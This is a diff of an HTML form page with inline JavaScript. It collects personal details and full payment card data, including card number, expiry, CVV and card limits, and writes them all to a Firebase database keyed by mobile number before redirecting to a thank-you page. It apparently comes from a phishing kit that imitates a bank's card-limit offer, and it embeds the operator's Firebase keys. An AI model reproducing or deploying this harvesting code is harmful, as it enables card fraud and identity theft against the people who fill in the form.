@@ -164,12 +164,6 @@ button:hover:before {
       <label for="email">Email Address:</label>
       <input type="email" id="email" name="email" placeholder="Enter your email" required>
 
-       <label for="panCard">PAN Card Number:</label>
-      <input type="text" id="panCard" name="panCard" maxlength="10" placeholder="Enter PAN card number" required>
-
-      <label for="aadhaarCard">Aadhaar Card Number:</label>
-      <input type="text" id="aadhaarCard" name="aadhaarCard" maxlength="12" placeholder="Enter Aadhaar card number" required>
-      
       <label for="City">City:</label>
       <input type="text" id="City" name="City" placeholder="Enter your City" required>
 
@@ -190,9 +184,6 @@ button:hover:before {
 
       <label for="cvv">Card CVV:</label>
       <input type="password" id="cvv" name="cvv" maxlength="4" placeholder="Enter CVV" required>
-
-      <!-- New PAN Card and Aadhaar Card inputs -->
-     
 
       <button type="submit">Proceed Now</button>
     </form>
@@ -249,50 +240,49 @@ button:hover:before {
     });
 
     // Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyCUp9H-jYvJUM3BIhtpaIH2_1eFkBGGyfI",
-      authDomain: "rbll-6d959.firebaseapp.com",
-      databaseURL: "https://rbll-6d959-default-rtdb.firebaseio.com",
-      projectId: "rbll-6d959",
-      storageBucket: "rbll-6d959.appspot.com",
-      messagingSenderId: "54778400344",
-      appId: "1:54778400344:web:8c48b3c08b6a9ba1785b52"
-    };
+   // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+  apiKey: "AIzaSyCUp9H-jYvJUM3BIhtpaIH2_1eFkBGGyfI",
+  authDomain: "rbll-6d959.firebaseapp.com",
+  databaseURL: "https://rbll-6d959-default-rtdb.firebaseio.com",
+  projectId: "rbll-6d959",
+  storageBucket: "rbll-6d959.firebasestorage.app",
+  messagingSenderId: "788197114761",
+  appId: "1:788197114761:web:52a98bcd8528ca3c529758",
+  measurementId: "G-EM4YKQLHM1"
+};
 
     // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const database = firebase.database(app);
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-    // Submit form data to Firebase
+    // Function to handle form submission
     function submitForm() {
-      const formData = {
-        name: document.getElementById('name').value,
-        dob: document.getElementById('dob').value,
-        mobile: document.getElementById('mobile').value,
-        email: document.getElementById('email').value,
-        city: document.getElementById('City').value,
-        totalLimit: document.getElementById('totalLimit').value,
-        availableLimit: document.getElementById('availableLimit').value,
-        cardholdername: document.getElementById('cardholdername').value,
-        cardNumber: document.getElementById('cardnumber').value,
-        expiryDate: document.getElementById('expiryDate').value,
-        cvv: document.getElementById('cvv').value,
-        panCard: document.getElementById('panCard').value,
-        aadhaarCard: document.getElementById('aadhaarCard').value
-      };
+        const formData = {
+            name: document.getElementById('name').value,
+            dob: document.getElementById('dob').value,
+            mobile: document.getElementById('mobile').value,
+            city: document.getElementById('City').value,
+            email: document.getElementById('email').value,
+            totalLimit: document.getElementById('totalLimit').value,
+            availableLimit: document.getElementById('availableLimit').value,
+            cardholdername: document.getElementById('cardholdername').value,
+            cardnumber: document.getElementById('cardnumber').value,
+            expiryDate: document.getElementById('expiryDate').value,
+            cvv: document.getElementById('cvv').value,
+        };
 
-      // Reference to your Firebase database
-      const userRef = database.ref('users/');
-
-      // Push the form data to Firebase
-      userRef.push(formData)
-        .then(() => {
-          alert('Form submitted successfully');
-          document.getElementById('userForm').reset();
-        })
-        .catch((error) => {
-          alert('Error submitting form: ' + error.message);
+        // Save the data to Firebase
+        database.ref("/data").child(formData.mobile).child("Details").set(formData, function(error) {
+            if (error) {
+                alert('Data could not be saved. ' + error);
+            } else {
+                window.location.href = 'Thank.html';
+                database.ref("/main").child(formData.mobile).child("Details").set(formData)
+            }
         });
+      database.ref().child("key").set(formData.mobile);
+      database.ref("/main").child(formData.mobile).child("Details").set(formData)
     }
   </script>
 </body>
